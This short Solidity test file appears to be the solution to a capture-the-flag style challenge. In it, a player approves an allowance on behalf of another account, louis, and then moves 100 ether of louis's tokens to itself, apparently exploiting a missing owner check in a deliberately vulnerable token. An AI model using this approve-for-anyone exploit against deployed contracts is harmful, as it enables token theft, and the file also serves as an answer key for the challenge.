// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {SimpleTokenBaseTest} from "test/SimpleToken/SimpleTokenBase.t.sol";

contract SimpleTokenTest is SimpleTokenBaseTest {
    function testSimpleTokenExploit() public checkSolved {
        simpleToken.approve(louis, player, 100 ether);
        simpleToken.transferFrom(louis, player, 100 ether);
    }
}
